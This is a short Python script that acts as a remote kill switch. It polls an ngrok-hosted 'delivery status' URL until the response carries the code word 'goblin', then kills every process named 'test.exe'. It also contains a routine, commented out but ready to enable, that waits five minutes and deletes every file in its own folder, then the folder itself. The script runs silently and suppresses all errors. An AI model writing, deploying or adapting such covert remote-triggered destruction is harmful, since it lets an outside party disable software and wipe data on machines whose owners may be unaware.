import time
import requests
import os
import psutil


config = {
    "check_url": "https://moderately-glowing-iguana.ngrok-free.app/dashboard/diliverystatus",
    "code": "goblin",
    "process": "test.exe"  
}

def kill_process_by_name(name):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == name:
            proc.kill()

def delete_files():
    time.sleep(300)
    folder = os.path.dirname(os.path.realpath(__file__))
    for file in os.listdir(folder):
        try:
            os.remove(os.path.join(folder, file))
        except Exception as e:
            pass
    try:
        os.rmdir(folder)  
    except:
        pass

while True:
    try:
        response = requests.get(config['check_url'])
     
        if config['code'] == response.json()['status']:
            print("start")
            kill_process_by_name(config['process'])
            # delete_files()
            print("end")
            break
    except:
        pass
    time.sleep(10)  
